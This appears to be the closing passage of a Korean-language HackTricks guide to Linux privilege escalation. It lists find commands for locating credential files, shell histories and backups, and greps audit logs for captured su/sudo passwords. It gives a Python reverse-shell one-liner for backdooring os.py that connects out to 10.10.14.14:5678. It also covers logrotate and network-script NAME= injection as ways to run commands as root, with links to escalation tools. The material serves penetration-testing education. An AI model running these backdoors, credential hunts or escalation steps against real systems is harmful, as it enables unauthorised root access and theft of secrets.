find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH의 스크립트/바이너리**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호를 포함할 수 있는 알려진 파일들

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 읽어보면, **비밀번호를 포함할 수 있는 여러 가능한 파일들**을 검색합니다.\
이와 관련해 사용할 수 있는 **또 다른 흥미로운 도구**는: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)로, Windows, Linux & Mac에 로컬로 저장된 많은 비밀번호를 복구하는 데 사용되는 오픈 소스 애플리케이션입니다.

### Logs

로그를 읽을 수 있다면 그 안에서 **흥미로운/기밀 정보**를 찾을 수 있습니다. 로그가 더 이상할수록(아마도) 더 흥미로울 가능성이 큽니다.\
또한, 일부 **bad**로 구성된 (backdoored?) **audit logs**는 이 게시물에 설명된 것처럼 audit logs 내부에 비밀번호를 **기록**하도록 허용할 수 있습니다: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**로그를 읽기 위한 그룹** [**adm**](interesting-groups-linux-pe/index.html#adm-group)은 매우 도움이 됩니다.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

또한 파일의 **이름**이나 **내용** 안에 "**password**"라는 단어가 포함된 파일을 확인해야 하며, 로그 내의 IP나 이메일 또는 해시 정규식도 확인하세요.\
여기서 이 모든 방법을 어떻게 수행하는지 전부 나열하지는 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사들을 확인해 보세요.

## 쓰기 가능한 파일

### Python library hijacking

만약 어떤 python 스크립트가 **어디에서** 실행될지 알고 그 폴더에 **쓸 수 있다**거나 **python 라이브러리를 수정할 수 있다**면, OS 라이브러리를 수정해 backdoor할 수 있습니다 (python 스크립트가 실행되는 위치에 쓸 수 있다면, os.py 라이브러리를 복사해서 붙여넣으세요).

라이브러리에 **backdoor the library** 하려면 os.py 라이브러리의 끝에 다음 줄을 추가하세요 (IP와 PORT를 변경하세요):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### logrotate 취약점 악용

`logrotate`의 취약점은 로그 파일이나 그 상위 디렉터리에 대해 **쓰기 권한**을 가진 사용자가 권한 상승을 얻을 수 있게 합니다. 이는 종종 **root**로 실행되는 `logrotate`가 임의 파일을 실행하도록 조작될 수 있기 때문이며, 특히 _**/etc/bash_completion.d/**_ 같은 디렉터리에서 그렇습니다. 따라서 권한 검사는 _/var/log_뿐만 아니라 로그 회전이 적용되는 모든 디렉터리에서 수행해야 합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 줍니다

이 취약점에 대한 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)으로 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 와 매우 유사하므로, 로그를 변경할 수 있는 경우 누가 해당 로그를 관리하는지 확인하고 로그를 symlink로 대체해 권한 상승이 가능한지 확인하세요.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **쓰기**할 수 있거나 기존 스크립트를 **수정**할 수 있다면, 귀하의 **system is pwned** 상태입니다.

Network scripts, _ifcg-eth0_ 같은 것은 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 거의 동일하게 보입니다. 그러나 Linux에서는 Network Manager (dispatcher.d)에 의해 ~sourced~ 됩니다.

제 경우에는 이러한 네트워크 스크립트의 `NAME=` 속성이 올바르게 처리되지 않았습니다. 이름에 **white/blank space**가 있으면 시스템은 공백 이후 부분을 실행하려고 시도합니다. 즉, **첫 번째 공백 이후의 모든 것이 root로 실행됩니다**.

예: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id_ 사이의 공백에 주의하세요_)

### **init, init.d, systemd, and rc.d**

디렉터리 `/etc/init.d` 는 System V init (SysVinit)을 위한 **scripts**의 홈입니다. 여기에는 서비스 `start`, `stop`, `restart` 및 경우에 따라 `reload` 스크립트가 포함되어 있습니다. 이들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 계열 시스템의 대체 경로는 `/etc/rc.d/init.d` 입니다.

반면 `/etc/init` 은 **Upstart**와 연관되어 있으며, Ubuntu에서 도입된 새로운 **service management**로 서비스 관리를 위한 구성 파일을 사용합니다. Upstart로의 전환이 이루어졌더라도 Upstart의 호환성 레이어 때문에 SysVinit 스크립트는 여전히 Upstart 구성과 함께 사용됩니다.

**systemd**는 현대적인 초기화 및 서비스 관리자로 등장했으며, 필요 시 데몬 시작(on-demand daemon starting), automount 관리, 시스템 상태 스냅샷(system state snapshots)과 같은 고급 기능을 제공합니다. 배포 패키지는 `/usr/lib/systemd/`에, 관리자가 수정하는 항목은 `/etc/systemd/system/`에 정리되어 시스템 관리 과정을 단순화합니다.

## 기타 요령

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 제한된 Shell에서의 탈출


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 훅(hook)하여 privileged kernel 기능을 userspace manager에 노출합니다. 관리자(manager) 인증이 약할 경우(예: FD-order 기반의 signature 체크나 취약한 비밀번호 방식) 로컬 앱이 manager를 가장하여 이미 루팅된 디바이스에서 root로 상승할 수 있습니다. 자세한 내용과 익스플로잇 방법은 다음을 참조하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## 커널 보안 보호

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux 로컬 privilege escalation 벡터를 찾기 위한 최고의 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot (물리적 접근):** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**더 많은 스크립트 모음**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 참고자료

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
